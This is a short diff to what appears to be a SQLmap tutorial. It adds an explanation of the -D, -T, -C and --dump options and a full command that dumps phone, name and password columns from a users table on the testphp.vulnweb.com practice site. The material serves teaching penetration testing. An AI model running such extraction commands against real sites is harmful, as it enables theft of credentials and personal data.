@@ -24,5 +24,9 @@ Specify the desired database using –D and tell SQLmap to list the tables using
 Specify the database using –D, table using – T and columns using –columns:
 > sqlmap -u 'url' -D db_name -T table_name –columns
 
+As usual, use –D for database, -T for table, -C for column and –dump for data. The final command to fetch data will appear as shownbelow:
+
+> sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' -D acuart -T users -C phone,name,pass --dump
+
 All options on sqlmap page
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
